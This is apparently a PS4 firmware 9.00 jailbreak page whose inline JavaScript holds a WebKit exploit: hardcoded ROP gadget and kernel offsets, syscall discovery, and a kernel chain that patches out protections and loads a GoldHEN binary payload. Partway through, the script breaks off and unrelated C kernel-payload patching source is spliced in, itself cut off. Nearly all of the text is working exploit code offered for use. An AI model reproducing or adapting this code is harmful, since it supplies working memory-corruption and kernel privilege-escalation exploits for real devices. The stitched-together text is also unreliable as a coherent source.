<html manifest="Cache.manifest">

<head>
    <style>
        html,
        body {
            margin: auto;
            font-family: sans-serif;
            font-size: 20px;
            font-weight: lighter;
            text-align: left;
            color: #ffff;
            background-size: cover;
        }

        .title {
            font-size: 40px;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-weight: bolder;
            margin-bottom: 10px;
        }

        hr {
            padding: 0;
            margin: 0 100px;
            opacity: 0.7;
        }

        #progress {
            font-weight: bold;
            text-shadow: 4px 4px 4px black;
            font-size: 17px;
        }
    </style>

    <script>
        window.applicationCache.ondownloading = function () {
            document.getElementById('progress').innerHTML =
                'sedang download ceche,mohon menunggu!!';
        };
        window.applicationCache.onprogress = function (a) {
            document.getElementById('progress').innerHTML =
                Math.round(100 * (a.loaded / a.total)) + '%';
        };
        window.applicationCache.oncached = function (e) {
            document.getElementById('progress').innerHTML =
                'download cache berhasil !!';
            setTimeout(function () {
                document.getElementById('progress').innerHTML = 'silahkan tutup & buka kembali browser nya  !!';
            }, 1500);
            localStorage.cachedG = 'yes';
        };
    </script>
    <meta charset="utf-8" />
    <title>OGE Fw 9.00</title>
    <script>
        function loadBIN() {
            var req = new XMLHttpRequest();
            req.responseType = 'arraybuffer';
            req.open('GET', PLfile);
            req.send();
            req.onreadystatechange = function () {
                if (req.readyState == 4) {
                    PLD = req.response;
                    var payload_buffer = chain.syscall(
                        477,
                        0,
                        PLD.byteLength * 4,
                        7,
                        0x1002,
                        -1,
                        0
                    );
                    var pl = p.array_from_address(payload_buffer, PLD.byteLength * 4);
                    var padding = new Uint8Array(
                        4 - ((req.response.byteLength % 4) % 4)
                    );
                    var tmp = new Uint8Array(
                        req.response.byteLength + padding.byteLength
                    );
                    tmp.set(new Uint8Array(req.response), 0);
                    tmp.set(padding, req.response.byteLength);
                    var shellcode = new Uint32Array(tmp.buffer);
                    pl.set(shellcode, 0);
                    var pthread = p.malloc(0x10);
                    chain.call(
                        libKernelBase.add32(OFFSET_lk_pthread_create),
                        pthread,
                        0x0,
                        payload_buffer,
                        0
                    );
                    allset();
                }
            };
        }

        function jbdone() {
            goldhen();
        }

        function allset() {
            window.progress.innerHTML = LoadedMSG;
        }

        function goldhen() {
            progress.innerHTML = 'sedang menjalankan goldhen mohon menunggu ';
            LoadedMSG = 'GoldHEN berhasil dijalankan';
            PLfile = 'goldhen.bin';
            setTimeout(loadBIN, 50);
        }
    </script>
</head>

<body onload="if(localStorage.cachedG=='yes')setTimeout(poc,50);" style="background-color: #171717">
    <h1 style="
        text-shadow: 4px 4px 4px black;
        font-size: 80px;
        text-align: center;
        text-shadow: 4px 4px 4px black;
        color: #0728E3;
        margin: 5% 0 10% 0;
      ">
        OGE Fw9.00 
    </h1>
    <hr>
    <h1 id="progress" style="
        font-size: 25px;
        text-align: center;
        text-shadow: 4px 4px 4px black;
        color: #EDEDED;
      ">
        sedang proses...mohon menunggu... 
    </h1>
    <hr>

    <script>
        const OFFSET_wk_vtable_first_element = 0x104f110;
        const OFFSET_WK_memset_import = 0x000002a8;
        const OFFSET_WK___stack_chk_fail_import = 0x00000178;
        const OFFSET_WK_psl_builtin_import = 0xd68;
        const OFFSET_WKR_psl_builtin = 0x33ba0;
        const OFFSET_WK_setjmp_gadget_one = 0x0106acf7;
        const OFFSET_WK_setjmp_gadget_two = 0x01ece1d3;
        const OFFSET_WK_longjmp_gadget_one = 0x0106acf7;
        const OFFSET_WK_longjmp_gadget_two = 0x01ece1d3;
        const OFFSET_libcint_memset = 0x0004f810;
        const OFFSET_libcint_setjmp = 0x000bb5bc;
        const OFFSET_libcint_longjmp = 0x000bb616;
        const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
        const OFFSET_lk___stack_chk_fail = 0x0001ff60;
        const OFFSET_lk_pthread_create = 0x00025510;
        const OFFSET_lk_pthread_join = 0x0000afa0;
        var chain;
        var kchain;
        var kchain2;
        var SAVED_KERNEL_STACK_PTR;
        var KERNEL_BASE_PTR;
        var webKitBase;
        var webKitRequirementBase;
        var libSceLibcInternalBase;
        var libKernelBase;
        var textArea = document.createElement('textarea');
        var nogc = [];
        var syscalls = {};
        var gadgets = {};
        var wk_gadgetmap = {
            ret: 0x32,
            'pop rdi': 0x319690,
            'pop rsi': 0x1f4d6,
            'pop rdx': 0x986c,
            'pop rcx': 0x657b7,
            'pop r8': 0xafaa71,
            'pop r9': 0x422571,
            'pop rax': 0x51a12,
            'pop rsp': 0x4e293,
            'mov [rdi], rsi': 0x1a97920,
            'mov [rdi], rax': 0x10788f7,
            'mov [rdi], eax': 0x9964bc,
            'cli ; pop rax': 0x566f8,
            sti: 0x1fbbcc,
            'mov rax, [rax]': 0x241cc,
            'mov rax, [rsi]': 0x5106a0,
            'mov [rax], rsi': 0x1efd890,
            'mov [rax], rdx': 0x1426a82,
            'mov [rax], edx': 0x3b7fe4,
            'add rax, rsi': 0x170397e,
            'mov rdx, rax': 0x53f501,
            'add rax, rcx': 0x2fbcd,
            'mov rsp, rdi': 0x2048062,
            'mov rdi, [rax + 8] ; call [rax]': 0x751ee7,
            infloop: 0x7dff,
            'mov [rax], cl': 0xc6eaf,
        };
        var wkr_gadgetmap = { 'xchg rdi, rsp ; call [rsi - 0x79]': 0x1d74f0 };
        var wk2_gadgetmap = {
            'mov [rax], rdi': 0xffdd7,
            'mov [rax], rcx': 0x2c9eca,
            'mov [rax], cx': 0x15a7d52,
        };
        var hmd_gadgetmap = { 'add [r8], r12': 0x2bce1 };
        var ipmi_gadgetmap = {
            'mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]': 0x344b,
        };

        function run_hax() {
            userland();
            if (chain.syscall(23, 0).low != 0x0) {
                kernel();
            } else {
                jbdone();
            }
        }

        function int64(low, hi) {
            this.low = low >>> 0;
            this.hi = hi >>> 0;
            this.add32inplace = function (val) {
                var new_lo = (((this.low >>> 0) + val) & 0xffffffff) >>> 0;
                var new_hi = this.hi >>> 0;
                if (new_lo < this.low) {
                    new_hi++;
                }
                this.hi = new_hi;
                this.low = new_lo;
            };
            this.add32 = function (val) {
                var new_lo = (((this.low >>> 0) + val) & 0xffffffff) >>> 0;
                var new_hi = this.hi >>> 0;
                if (new_lo < this.low) {
                    new_hi++;
                }
                return new int64(new_lo, new_hi);
            };
            this.sub32 = function (val) {
                var new_lo = (((this.low >>> 0) - val) & 0xffffffff) >>> 0;
                var new_hi = this.hi >>> 0;
                if ((new_lo > this.low) & 0xffffffff) {
                    new_hi--;
                }
                return new int64(new_lo, new_hi);
            };
            this.sub32inplace = function (val) {
                var new_lo = (((this.low >>> 0) - val) & 0xffffffff) >>> 0;
                var new_hi = this.hi >>> 0;
                if ((new_lo > this.low) & 0xffffffff) {
                    new_hi--;
                }
                this.hi = new_hi;
                this.low = new_lo;
            };
            this.and32 = function (val) {
                var new_lo = this.low & val;
                var new_hi = this.hi;
                return new int64(new_lo, new_hi);
            };
            this.and64 = function (vallo, valhi) {
                var new_lo = this.low & vallo;
                var new_hi = this.hi & valhi;
                return new int64(new_lo, new_hi);
            };
            function zeroFill(number, width) {
                width -= number.toString().length;
                if (width > 0) {
                    return (
                        new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number
                    );
                }
                return number + '';
            }
            this.toString = function (val) {
                val = 16;
                var lo_str = (this.low >>> 0).toString(val);
                var hi_str = (this.hi >>> 0).toString(val);
                if (this.hi == 0) return lo_str;
                else lo_str = zeroFill(lo_str, 8);
                return hi_str + lo_str;
            };
            return this;
        }

        window.rop = function () {
            const stack_sz = 0x40000;
            const reserve_upper_stack = 0x10000;
            const stack_reserved_idx = reserve_upper_stack / 4;
            this.stackback = p.malloc32(stack_sz / 4 + 0x8);
            this.stack = this.stackback.add32(reserve_upper_stack);
            this.stack_array = this.stackback.backing;
            this.retval = this.stackback.add32(stack_sz);
            this.count = 1;
            this.branches_count = 0;
            this.branches_rsps = p.malloc(0x200);
            this.clear = function () {
                this.count = 1;
                this.branches_count = 0;
                for (var i = 1; i < stack_sz / 4 - stack_reserved_idx; i++) {
                    this.stack_array[i + stack_reserved_idx] = 0;
                }
            };
            this.pushSymbolic = function () {
                this.count++;
                return this.count - 1;
            };
            this.finalizeSymbolic = function (idx, val) {
                if (val instanceof int64) {
                    this.stack_array[stack_reserved_idx + idx * 2] = val.low;
                    this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
                } else {
                    this.stack_array[stack_reserved_idx + idx * 2] = val;
                    this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
                }
            };
            this.push = function (val) {
                this.finalizeSymbolic(this.pushSymbolic(), val);
            };
            this.push_write8 = function (where, what) {
                this.push(gadgets['pop rdi']);
                this.push(where);
                this.push(gadgets['pop rsi']);
                this.push(what);
                this.push(gadgets['mov [rdi], rsi']);
            };
            this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
                if (rdi != undefined) {
                    this.push(gadgets['pop rdi']);
                    this.push(rdi);
                }
                if (rsi != undefined) {
                    this.push(gadgets['pop rsi']);
                    this.push(rsi);
                }
                if (rdx != undefined) {
                    this.push(gadgets['pop rdx']);
                    this.push(rdx);
                }
                if (rcx != undefined) {
                    this.push(gadgets['pop rcx']);
                    this.push(rcx);
                }
                if (r8 != undefined) {
                    this.push(gadgets['pop r8']);
                    this.push(r8);
                }
                if (r9 != undefined) {
                    this.push(gadgets['pop r9']);
                    this.push(r9);
                }
                if (this.stack.add32(this.count * 0x8).low & 0x8) {
                    this.push(gadgets['ret']);
                }
                this.push(rip);
                return this;
            };
            this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
                this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
                this.write_result(this.retval);
                this.run();
                return p.read8(this.retval);
            };
            this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
                return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
            };
            this.get_rsp = function () {
                return this.stack.add32(this.count * 8);
            };
            this.write_result = function (where) {
                this.push(gadgets['pop rdi']);
                this.push(where);
                this.push(gadgets['mov [rdi], rax']);
            };
            this.write_result4 = function (where) {
                this.push(gadgets['pop rdi']);
                this.push(where);
                this.push(gadgets['mov [rdi], eax']);
            };
            this.jmp_rsp = function (rsp) {
                this.push(window.gadgets['pop rsp']);
                this.push(rsp);
            };
            this.run = function () {
                p.launch_chain(this);
                this.clear();
            };
            this.KERNEL_BASE_PTR_VAR;
            this.set_kernel_var = function (arg) {
                this.KERNEL_BASE_PTR_VAR = arg;
            };
            this.rax_kernel = function (offset) {
                this.push(gadgets['pop rax']);
                this.push(this.KERNEL_BASE_PTR_VAR);
                this.push(gadgets['mov rax, [rax]']);
                this.push(gadgets['pop rsi']);
                this.push(offset);
                this.push(gadgets['add rax, rsi']);
            };
            this.write_kernel_addr_to_chain_later = function (offset) {
                this.push(gadgets['pop rdi']);
                var idx = this.pushSymbolic();
                this.rax_kernel(offset);
                this.push(gadgets['mov [rdi], rax']);
                return idx;
            };
            this.kwrite8 = function (offset, qword) {
                this.rax_kernel(offset);
                this.push(gadgets['pop rsi']);
                this.push(qword);
                this.push(gadgets['mov [rax], rsi']);
            };
            this.kwrite4 = function (offset, dword) {
                this.rax_kernel(offset);
                this.push(gadgets['pop rdx']);
                this.push(dword);
                this.push(gadgets['mov [rax], edx']);
            };
            this.kwrite2 = function (offset, word) {
                this.rax_kernel(offset);
                this.push(gadgets['pop rcx']);
                this.push(word);
                this.push(gadgets['mov [rax], cx']);
            };
            this.kwrite1 = function (offset, byte) {
                this.rax_kernel(offset);
                this.push(gadgets['pop rcx']);
                this.push(byte);
                this.push(gadgets['mov [rax], cl']);
            };
            this.kwrite8_kaddr = function (offset1, offset2) {
                this.rax_kernel(offset2);
                this.push(gadgets['mov rdx, rax']);
                this.rax_kernel(offset1);
                this.push(gadgets['mov [rax], rdx']);
            };
            return this;
        };

        function userland() {
            p.launch_chain = launch_chain;
            p.malloc = malloc;
            p.malloc32 = malloc32;
            p.stringify = stringify;
            p.array_from_address = array_from_address;
            p.readstr = readstr;
            var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
            var textAreaVtable = p.read8(textAreaVtPtr);
            webKitBase = p
                .read8(textAreaVtable)
                .sub32(OFFSET_wk_vtable_first_element);
            libSceLibcInternalBase = p.read8(
                get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import))
            );
            libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
            libKernelBase = p.read8(
                get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import))
            );
            libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
            webKitRequirementBase = p.read8(
                get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import))
            );
            webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
            for (var gadget in wk_gadgetmap) {
                window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
            }
            for (var gadget in wkr_gadgetmap) {
                window.gadgets[gadget] = webKitRequirementBase.add32(
                    wkr_gadgetmap[gadget]
                );
            }
            function get_jmptgt(address) {
                var instr = p.read4(address) & 0xffff;
                var offset = p.read4(address.add32(2));
                if (instr != 0x25ff) {
                    return 0;
                }
                return address.add32(0x6 + offset);
            }
            function malloc(sz) {
                var backing = new Uint8Array(0x10000 + sz);
                window.nogc.push(backing);
                var ptr = p.read8(p.leakval(backing).add32(0x10));
                ptr.backing = backing;
                return ptr;
            }
            function malloc32(sz) {
                var backing = new Uint8Array(0x10000 + sz * 4);
                window.nogc.push(backing);
                var ptr = p.read8(p.leakval(backing).add32(0x10));
                ptr.backing = new Uint32Array(backing.buffer);
                return ptr;
            }
            function array_from_address(addr, size) {
                var og_array = new Uint32Array(0x1000);
                var og_array_i = p.leakval(og_array).add32(0x10);
                p.write8(og_array_i, addr);
                p.write4(og_array_i.add32(0x8), size);
                p.write4(og_array_i.add32(0xc), 0x1);
                nogc.push(og_array);
                return og_array;
            }
            function stringify(str) {
                var bufView = new Uint8Array(str.length + 1);
                for (var i = 0; i < str.length; i++) {
                    bufView[i] = str.charCodeAt(i) & 0xff;
                }
                window.nogc.push(bufView);
                return p.read8(p.leakval(bufView).add32(0x10));
            }
            function readstr(addr) {
                var str = '';
                for (var i = 0; ; i++) {
                    var c = p.read1(addr.add32(i));
                    if (c == 0x0) {
                        break;
                    }
                    str += String.fromCharCode(c);
                }
                return str;
            }
            var fakeVtable_setjmp = p.malloc32(0x200);
            var fakeVtable_longjmp = p.malloc32(0x200);
            var original_context = p.malloc32(0x40);
            var modified_context = p.malloc32(0x40);
            p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
            p.write8(
                fakeVtable_setjmp.add32(0xa8),
                webKitBase.add32(OFFSET_WK_setjmp_gadget_two)
            );
            p.write8(fakeVtable_setjmp.add32(0x10), original_context);
            p.write8(
                fakeVtable_setjmp.add32(0x8),
                libSceLibcInternalBase.add32(OFFSET_libcint_setjmp)
            );
            p.write8(
                fakeVtable_setjmp.add32(0x1c8),
                webKitBase.add32(OFFSET_WK_setjmp_gadget_one)
            );
            p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
            p.write8(
                fakeVtable_longjmp.add32(0xa8),
                webKitBase.add32(OFFSET_WK_longjmp_gadget_two)
            );
            p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
            p.write8(
                fakeVtable_longjmp.add32(0x8),
                libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)
            );
            p.write8(
                fakeVtable_longjmp.add32(0x1c8),
                webKitBase.add32(OFFSET_WK_longjmp_gadget_one)
            );
            function launch_chain(chain) {
                chain.push(window.gadgets['pop rdi']);
                chain.push(original_context);
                chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
                p.write8(textAreaVtPtr, fakeVtable_setjmp);
                textArea.scrollLeft = 0x0;
                p.write8(modified_context.add32(0x00), window.gadgets['ret']);
                p.write8(modified_context.add32(0x10), chain.stack);
                p.write8(
                    modified_context.add32(0x40),
                    p.read8(original_context.add32(0x40))
                );
                p.write8(textAreaVtPtr, fakeVtable_longjmp);
                textArea.scrollLeft = 0x0;
                p.write8(textAreaVtPtr, textAreaVtable);
            }
            var kview = new Uint8Array(0x1000);
            var kstr = p.leakval(kview).add32(0x10);
            var orig_kview_buf = p.read8(kstr);
            p.write8(kstr, window.libKernelBase);
            p.write4(kstr.add32(8), 0x40000);
            var countbytes;
            for (var i = 0; i < 0x40000; i++) {
                if (
                    kview[i] == 0x72 &&
                    kview[i + 1] == 0x64 &&
                    kview[i + 2] == 0x6c &&
                    kview[i + 3] == 0x6f &&
                    kview[i + 4] == 0x63
                ) {
                    countbytes = i;
                    break;
                }
            }
            p.write4(kstr.add32(8), countbytes + 32);
            var dview32 = new Uint32Array(1);
            var dview8 = new Uint8Array(dview32.buffer);
            for (var i = 0; i < countbytes; i++) {
                if (
                    kview[i] == 0x48 &&
                    kview[i + 1] == 0xc7 &&
                    kview[i + 2] == 0xc0 &&
                    kview[i + 7] == 0x49 &&
                    kview[i + 8] == 0x89 &&
                    kview[i + 9] == 0xca &&
                    kview[i + 10] == 0x0f &&
                    kview[i + 11] == 0x05
                ) {
                    dview8[0] = kview[i + 3];
                    dview8[1] = kview[i + 4];
                    dview8[2] = kview[i + 5];
                    dview8[3] = kview[i + 6];
                    var syscallno = dview32[0];
                    window.syscalls[syscallno] = window.libKernelBase.add32(i);
                }
            }
            p.write8(kstr, orig_kview_buf);
            chain = new rop();
            if (chain.syscall(20).low == 0) {
                alert('Webkit Exploit Failed. Try Again.');
                while (1);
            }
        }

        function kernel() {
            var handle;
            var random_path;
            var ex_info;

            function load_prx(name) {
                var res = chain.syscall(
                    594,
                    p.stringify(`/${random_path}/common/lib/${name}`),
                    0x0,
                    handle,
                    0x0
                );
                if (res.low != 0x0) {
                    alert('failed to load prx/get handle ' + name);
                }
                p.write8(ex_info, 0x1a8);
                res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
                if (res.low != 0x0) {
                    alert('failed to get module info from handle');
                }
                var tlsinit = p.read8(ex_info.add32(0x110));
                var tlssize = p.read4(ex_info.add32(0x11c));
                if (tlssize != 0) {
                    if (name == 'libSceWebKit2.sprx') {
                        tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
                    } else {
                        alert(
                            `${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`
                        );
                    }
                }
                return tlsinit;
            }

            function extra_gadgets() {
                handle = p.malloc(0x1e8);
                var randomized_path_length_ptr = handle.add32(0x4);
                var randomized_path_ptr = handle.add32(0x14);
                ex_info = randomized_path_ptr.add32(0x40);
                p.write8(randomized_path_length_ptr, 0x2c);
                chain.syscall(
                    602,
                    0,
                    randomized_path_ptr,
                    randomized_path_length_ptr
                );
                random_path = p.readstr(randomized_path_ptr);
                var ipmi_addr = load_prx('libSceIpmi.sprx');
                var hmd_addr = load_prx('libSceHmd.sprx');
                var wk2_addr = load_prx('libSceWebKit2.sprx');
                for (var gadget in hmd_gadgetmap) {
                    window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
                }
                for (var gadget in wk2_gadgetmap) {
                    window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
                }
                for (var gadget in ipmi_gadgetmap) {
                    window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
                }
                for (var gadget in window.gadgets) {
                    p.read8(window.gadgets[gadget]);
                    chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
                }
                chain.run();
            }

            function kchain_setup() {
                const KERNEL_busy = 0x1b28df8;
                const KERNEL_bcopy = 0xacd;
                const KERNEL_bzero = 0x2713fd;
                const KERNEL_pagezero = 0x271441;
                const KERNEL_memcpy = 0x2714bd;
                const KERNEL_pagecopy = 0x271501;
                const KERNEL_copyin = 0x2716ad;
                const KERNEL_copyinstr = 0x271b5d;
                const KERNEL_copystr = 0x271c2d;
                const KERNEL_setidt = 0x312c40;
                const KERNEL_setcr0 = 0x1fb949;
                const KERNEL_Xill = 0x17d500;
                const KERNEL_veriPatch = 0x626874;
                const KERNEL_enable_syscalls_1 = 0x490;
                const KERNEL_enable_syscalls_2 = 0x4b5;
                const KERNEL_enable_syscalls_3 = 0x4b9;
                const KERNEL_enable_syscalls_4 = 0x4c2;
                const KERNEL_mprotect = 0x80b8d;
                const KERNEL_prx = 0x23aec4;
                const KERNEL_dlsym_1 = 0x23b67f;
                const KERNEL_dlsym_2 = 0x221b40;
                const KERNEL_setuid = 0x1a06;
                const KERNEL_syscall11_1 = 0x1100520;
                const KERNEL_syscall11_2 = 0x1100528;
                const KERNEL_syscall11_3 = 0x110054c;
                const KERNEL_syscall11_gadget = 0x4c7ad;
                const KERNEL_mmap_1 = 0x16632a;
                const KERNEL_mmap_2 = 0x16632d;
                const KERNEL_setcr0_patch = 0x3ade3b;
                const KERNEL_kqueue_close_epi = 0x398991;
                SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
                KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
                p.write8(KERNEL_BASE_PTR, new int64(0xff80e364, 0xffffffff));
                kchain = new rop();
                kchain2 = new rop();
                {
                    chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
                    chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
                    chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
                }
                chain.run();
                kchain.count = 0;
                kchain2.count = 0;
                kchain.set_kernel_var(KERNEL_BASE_PTR);
                kchain2.set_kernel_var(KERNEL_BASE_PTR);
                kchain.push(gadgets['pop rax']);
                kchain.push(SAVED_KERNEL_STACK_PTR);
                kchain.push(gadgets['mov [rax], rdi']);
                kchain.push(gadgets['pop r8']);
                kchain.push(KERNEL_BASE_PTR);
                kchain.push(gadgets['add [r8], r12']);
                kchain.kwrite1(KERNEL_busy, 0x1);
                kchain.push(gadgets['sti']);
                var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
                var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
                kchain.push(gadgets['pop rdi']);
                kchain.push(0x6);
                kchain.push(gadgets['pop rsi']);
                kchain.push(gadgets['mov rsp, rdi']);
                kchain.push(gadgets['pop rdx']);
                kchain.push(0xe);
                kchain.push(gadgets['pop rcx']);
                kchain.push(0x0);
                kchain.push(gadgets['pop r8']);
                kchain.push(0x0);
                var idx1_dest = kchain.get_rsp();
                kchain.pushSymbolic();
                kchain.push(gadgets['pop rsi']);
                kchain.push(0x80040033);
                kchain.push(gadgets['pop rdi']);
                kchain.push(kchain2.stack);
                var idx2_dest = kchain.get_rsp();
                kchain.pushSymbolic();
                kchain.finalizeSymbolic(idx1, idx1_dest);
                kchain.finalizeSymbolic(idx2, idx2_dest);
                kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
                kchain2.kwrite1(KERNEL_bcopy, 0xeb);
                kchain2.kwrite1(KERNEL_bzero, 0xeb);
                kchain2.kwrite1(KERNEL_pagezero, 0xeb);
                kchain2.kwrite1(KERNEL_memcpy, 0xeb);
                kchain2.kwrite1(KERNEL_pagecopy, 0xeb);
                kchain2.kwrite1(KERNEL_copyin, 0xeb);
                kchain2.kwrite1(KERNEL_copyinstr, 0xeb);
                kchain2.kwrite1(KERNEL_copystr, 0xeb);
                kchain2.kwrite1(KERNEL_busy, 0x0);
                var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
                var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
                kchain2.push(gadgets['pop rdi']);
                kchain2.push(0x6);
                kchain2.push(gadgets['pop rsi']);
                var idx3_dest = kchain2.get_rsp();
                kchain2.pushSymbolic();
                kchain2.push(gadgets['pop rdx']);
                kchain2.push(0xe);
                kchain2.push(gadgets['pop rcx']);
                kchain2.push(0x0);
                kchain2.push(gadgets['pop r8']);
                kchain2.push(0x0);
                var idx4_dest = kchain2.get_rsp();
                kchain2.pushSymbolic();
                kchain2.finalizeSymbolic(idx3, idx3_dest);
                kchain2.finalizeSymbolic(idx4, idx4_dest);
                kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
                kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xeb);
                kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
                kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
                kchain2.kwrite1(KERNEL_setuid, 0xeb);
                kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
                kchain2.kwrite2(KERNEL_prx, 0xe990);
                kchain2.kwrite1(KERNEL_dlsym_1, 0xeb);
                kchain2.kwrite4(KERNEL_dlsym_2, 0xc3c03148);
                kchain2.kwrite1(KERNEL_mmap_1, 0x37);
                kchain2.kwrite1(KERNEL_mmap_2, 0x37);
                kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
                kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
                kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
                kchain2.kwrite4(KERNEL_setcr0_patch, 0xc3c7220f);
                var idx5 =
                    kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
                kchain2.push(gadgets['pop rdi']);
                kchain2.push(0x80050033);
                var idx5_dest = kchain2.get_rsp();
                kchain2.pushSymbolic();
                kchain2.finalizeSymbolic(idx5, idx5_dest);
                kchain2.rax_kernel(KERNEL_kqueue_close_epi);
                kchain2.push(gadgets['mov rdx, rax']);
                kchain2.push(gadgets['pop rsi']);
                kchain2.push(SAVED_KERNEL_STACK_PTR);
                kchain2.push(gadgets['mov rax, [rsi]']);
                kchain2.push(gadgets['pop rcx']);
                kchain2.push(0x10);
                kchain2.push(gadgets['add rax, rcx']);
                kchain2.push(gadgets['mov [rax], rdx']);
                kchain2.push(gadgets['pop rdi']);
                var idx6 = kchain2.pushSymbolic();
                kchain2.push(gadgets['mov [rdi], rax']);
                kchain2.push(gadgets['sti']);
                kchain2.push(gadgets['pop rsp']);
                var idx6_dest = kchain2.get_rsp();
                kchain2.pushSymbolic();
                kchain2.finalizeSymbolic(idx6, idx6_dest);
            #include <ps4.h>

#include "config_struct.h"
#include "offsets.h"

#include "kpayloads.h"

#include "kpayload.inc.c"

#define KERNEL_BASE_FILE 0xFFFFFFFF82200000

#define patch_macro(x)                                                                           \
  kernel_base = &((uint8_t *)__readmsr(0xC0000082))[-K##x##_XFAST_SYSCALL];                      \
  kernel_ptr = (uint8_t *)kernel_base;                                                           \
  uart_patch = &kernel_ptr[K##x##_UART_PATCH];                                                   \
  /* is_diag_process_patch = &kernel_ptr[K##x##_IS_DIAG_PROCESS_PATCH]; */                       \
  /* allow_system_level_logging_patch = &kernel_ptr[K##x##_ALLOW_SYSTEM_LEVEL_LOGGING_PATCH]; */ \
  /* allow_coredump_patch = &kernel_ptr[K##x##_ALLOW_COREDUMP_PATCH]; */                         \
  copyin_patch_1 = &kernel_ptr[K##x##_COPYIN_PATCH_1];                                           \
  copyin_patch_2 = &kernel_ptr[K##x##_COPYIN_PATCH_2];                                           \
  copyout_patch_1 = &kernel_ptr[K##x##_COPYOUT_PATCH_1];                                         \
  copyout_patch_2 = &kernel_ptr[K##x##_COPYOUT_PATCH_2];                                         \
  copyinstr_patch_1 = &kernel_ptr[K##x##_COPYINSTR_PATCH_1];                                     \
  copyinstr_patch_2 = &kernel_ptr[K##x##_COPYINSTR_PATCH_2];                                     \
  copyinstr_patch_3 = &kernel_ptr[K##x##_COPYINSTR_PATCH_3];                                     \
  setlogin_patch = &kernel_ptr[K##x##_SETLOGIN_PATCH];                                           \
  pfs_signature_check_patch = &kernel_ptr[K##x##_PFS_SIGNATURE_CHECK_PATCH];                     \
  debug_rif_patch_1 = &kernel_ptr[K##x##_DEBUG_RIF_PATCH_1];                                     \
  debug_rif_patch_2 = &kernel_ptr[K##x##_DEBUG_RIF_PATCH_2];                                     \
  debug_settings_error_patch_1 = &kernel_ptr[K##x##_DEBUG_SETTINGS_ERROR_PATCH_1];               \
  debug_settings_error_patch_2 = &kernel_ptr[K##x##_DEBUG_SETTINGS_ERROR_PATCH_2];               \
  /* mount_patch = &kernel_ptr[K##x##_MOUNT_PATCH]; */                                           \
  depth_limit_patch = &kernel_ptr[K##x##_DEPTH_LIMIT_PATCH];

#define install_macro(x)                                                    \
  kernel_base = &((uint8_t *)__readmsr(0xC0000082))[-K##x##_XFAST_SYSCALL]; \
  kernel_ptr = (uint8_t *)kernel_base;                                      \
  kernel_pmap_store = &kernel_ptr[K##x##_PMAP_STORE];                       \
  pmap_protect_p_patch = &kernel_ptr[K##x##_PMAP_PROTECT_P];                \
  pmap_protect = (void *)(kernel_base + K##x##_PMAP_PROTECT);

struct kpayload_payload_header {
  uint64_t signature;
  size_t entrypoint_offset;
};

struct kpayload_payload_info {
  uint16_t fw_version;
  struct configuration config;
  uint8_t *buffer;
  size_t size;
};

struct kpayload_install_payload_args {
  void *syscall_handler;
  struct kpayload_payload_info *kpayload_payload_info;
};

// Return 0 on success
// Return -1 on unsupported firmware error
// Can also just give a memory error in the browser or panic the console on failure
static int kpayload_patches(struct thread *td, struct kpayload_firmware_args *args) {
  UNUSED(td);
  void *kernel_base;
  uint8_t *kernel_ptr;

  // Use "kmem" for all patches
  uint8_t *kmem;

  // Pointers to be assigned in build_kpayload macro
  uint8_t *uart_patch;
  // uint8_t *is_diag_process_patch;
  // uint8_t *allow_system_level_logging_patch;
  // uint8_t *allow_coredump_patch;
  uint8_t *copyin_patch_1;
  uint8_t *copyin_patch_2;
  uint8_t *copyout_patch_1;
  uint8_t *copyout_patch_2;
  uint8_t *copyinstr_patch_1;
